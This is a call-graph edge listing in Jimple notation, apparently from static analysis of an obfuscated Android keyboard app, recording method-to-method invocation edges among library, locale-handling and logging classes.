VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int j()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: $z0 = staticinvoke <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>($r2, $r3, $l0, $r1) in <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)> ==> <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i3, $i6) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <lum: lvm i()>() in <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)> ==> <lum: lvm i()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r4, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
STATIC edge: $r4 = staticinvoke <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>($r3, $r1, $i0, $r2) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(7) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r4, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String e(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <iwt: java.lang.String e(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_GRPC_FEATURE", 16, 16) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r22.<mag: void <init>(java.lang.String,int,int)>("LOCAL", 22, 22) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<ljs: void <init>()>() in <ljs: void <clinit>()> ==> <ljs: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(17) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <lak: void <init>(byte[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lnd: java.lang.Object a(int)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(long[],long[])>($r10, $r11) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(long[],long[])>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(16) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
SPECIAL edge: specialinvoke $r4.<hbv: void <init>(java.lang.String)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean k(char)>
VIRTUAL edge: virtualinvoke $r3.<hbv: void k(java.lang.Object,boolean)>($r1, 0) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hbv: void k(java.lang.Object,boolean)>
CLINIT edge: staticinvoke <lsq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsq: void <clinit>()>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(19) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r3, $r4) in <lqm: java.lang.Object get(int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r6, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Gif", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r1.<java.util.NoSuchElementException: void <init>()>() in <lnc: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $l0 = virtualinvoke $r0.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/r;", "lockState") in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
CLINIT edge: staticinvoke <luk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <luk: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lkq: boolean isEmpty()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r4.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i5, $r2) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int b()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r3, 0, $i0) in <ivv: ivw b(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "parser") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>($r5, $r0, $r1, $r2, $r3) in <iwt: void <clinit>()> ==> <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<lsm: int a(lsz)>($r2) in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: int a(lsz)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lkx: lma p()>() in <llg: void <init>(llo)> ==> <lkx: lma p()>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <iwt: java.lang.String c(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>() in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r1, $i1) in <lri: void v(java.lang.Object[],int)> ==> <lri: void t(java.lang.Object,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "log site qualifier") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean y(char)>($c5) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean y(char)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: void j(java.lang.Object)> ==> <lma: int e(int)>
VIRTUAL edge: $r1 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hcb: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null languageTag") in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<ing: void <init>(java.lang.String,iec)>($r2, $r3) in <iej: void g(java.lang.String,iec)> ==> <ing: void <init>(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <miv: void <clinit>()> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(5) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>(null) in <miv: void <clinit>()> ==> <miv: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <ivv: void <init>(byte[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, 1, $i1) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("PlaystoreStickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <lwg: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke $r3.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_THUMBNAIL", 3, 3) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int compareTo(java.lang.Enum)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>("array index scale not a power of two") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $l0 = staticinvoke <java.lang.System: long currentTimeMillis()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long currentTimeMillis()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String c(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
STATIC edge: $i0 = staticinvoke <kwe: int O(long,long)>($l1, $l2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kwe: int O(long,long)>
VIRTUAL edge: $r9 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <ltr: java.lang.Object d(lsz)>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("cja-XA", "doi-XA", "doi-XD", "doi-XU", "doi-Deva", "doi-Latn", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r2, $i1, $r3, 0, $i0) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r2, $i2) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r14 = staticinvoke <lkq: lkl e()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkq: lkl e()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <ltr: void <init>()> ==> <lts: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(16) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lnd: void <init>(java.lang.Object[])>($r1) in <lnd: void <clinit>()> ==> <lnd: void <init>(java.lang.Object[])>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r21.<mag: void <init>(java.lang.String,int,int)>("CURATED_IMAGE", 21, 21) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <jvu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jvu: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(8) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "transferIndex") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("invalid tag type: ") in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>("zh-CN", "com.google.android.inputmethod.pinyin", "zh-TW", "com.google.android.apps.inputmethod.zhuyin", "zh-HK", "com.google.android.apps.inputmethod.cantonese", "ko", "com.google.android.inputmethod.korean") in <hnt: void <clinit>()> ==> <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>($r1) in <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentShift", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r1, $i0, 0, $i1) in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r19.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_CREATE", 19, 19) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <lsm: int b()>
SPECIAL edge: specialinvoke $r0.<lwg: void <init>()>() in <lwh: void <clinit>()> ==> <lwg: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<gbk: void <init>(int)>(18) in <ivw: void <clinit>()> ==> <gbk: void <init>(int)>
INTERFACE edge: $r6 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<java.lang.StringBuilder: void <init>()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, 0) in <lvr: void <init>(java.util.List)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r8.<lup: void <init>(lwc,java.lang.String)>($r9, $r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lup: void <init>(lwc,java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <nzh: java.lang.String c()> ==> <java.lang.String: void <init>(char[],int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>()>
VIRTUAL edge: $r9 = virtualinvoke r0.<lsn: lwc a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsd: lwc a()>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsc: java.lang.String e()>() in <lsh: lse h(java.util.logging.Level)> ==> <lsc: java.lang.String e()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lkx: boolean containsKey(java.lang.Object)> ==> <lqk: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>() in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, $i2, $r8, $i3, $i5) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r29.<mag: void <init>(java.lang.String,int,int)>("TENOR_STATIC_IMAGE", 29, 29) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
